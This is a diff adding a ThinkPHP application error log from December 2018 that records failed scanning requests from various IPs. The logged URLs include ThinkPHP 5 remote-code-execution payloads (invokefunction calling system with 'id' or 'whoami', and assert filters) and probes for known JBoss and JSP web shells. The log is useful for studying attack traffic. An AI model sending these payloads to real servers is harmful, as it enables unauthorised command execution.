@@ -1,0 +1,102 @@
+[ 2018-12-12T00:23:16+08:00 ] 51.68.125.64 /jexws4/jexws4.jsp
+ERR: 无法加载控制器:Jexws4
+
+[ 2018-12-12T01:13:54+08:00 ] 103.255.179.9 /index.php?%20s=%7B%7B%7Bpath_info%7D%7D%7D/%5Cthink%5CRequest/input&data=var_dump(748936936-344)&filter[]=assert
+ERR: 无法加载控制器:{{{path_info}}}
+
+[ 2018-12-12T01:13:54+08:00 ] 103.255.179.9 /index.php?%20s=%7B%7B%7Bpath_info%7D%7D%7D/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=var_dump(748936936-344)
+ERR: 无法加载控制器:{{{path_info}}}
+
+[ 2018-12-12T01:13:54+08:00 ] 103.255.179.9 /index.php?%20s=index/%5Cthink%5CRequest/input&data=var_dump(748936936-344)&filter[]=assert
+ERR: 非法操作:\think\Request
+
+[ 2018-12-12T01:13:54+08:00 ] 103.255.179.9 /index.php?%20s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=var_dump(748936936-344)
+ERR: 非法操作:\think\app
+
+[ 2018-12-12T08:04:53+08:00 ] 80.211.69.242 /phpmyadmin/4.2/installing/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-12-12T11:36:17+08:00 ] 45.77.240.182 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+ERR: 非法操作:\think\app
+
+[ 2018-12-12T11:45:17+08:00 ] 61.135.255.185 /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+ERR: 非法操作:\think\app
+
+[ 2018-12-12T12:27:08+08:00 ] 103.65.40.69 /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+ERR: 非法操作:\think\app
+
+[ 2018-12-12T15:32:51+08:00 ] 178.93.230.221 /HNAP1/
+ERR: 无法加载控制器:HNAP1
+
+[ 2018-12-12T17:49:10+08:00 ] 140.143.165.228 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-12T17:49:13+08:00 ] 140.143.165.228 /jexsw2/jexsw2.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexsw2
+
+[ 2018-12-12T17:49:13+08:00 ] 140.143.165.228 /jexws2/jexws2.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws2
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jexws3/jexws3.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws3
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jexws4/jexws4.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws4
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jexinv/jexinv.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jexinv3/jexinv3.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv3
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jexinv4/jexinv4.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv4
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jbossass/jbossass.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jbossass
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /console/jspzxc.jsp?cmd=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Console
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /demo/404.jsp?bjh=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Demo
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /dread/lock.jsp?tezaz=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Dread
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /HCEGH/xunfeng.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:HCEGH
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jbws/jbws.jsp?eval=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jbws
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /jvrx/cmd.jsp?pwd=everymorning&cmd=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jvrx
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /shellinvoker/shellinvoker.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Shellinvoker
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /zecmd/zecmd.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Zecmd
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /iesvc/iesvc.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Iesvc
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /idssvc/idssvc.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Idssvc
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /wstats/wstats.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Wstats
+
+[ 2018-12-12T17:49:14+08:00 ] 140.143.165.228 /a/pwn.jsp?cmd=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:A
+
+[ 2018-12-12T17:49:16+08:00 ] 140.143.165.228 /ws/v1/cluster/apps/new-application
+ERR: 无法加载控制器:Ws
+
+[ 2018-12-12T17:49:16+08:00 ] 140.143.165.228 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-12-12T23:39:26+08:00 ] 115.205.236.175 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+ERR: 非法操作:\think\app
+
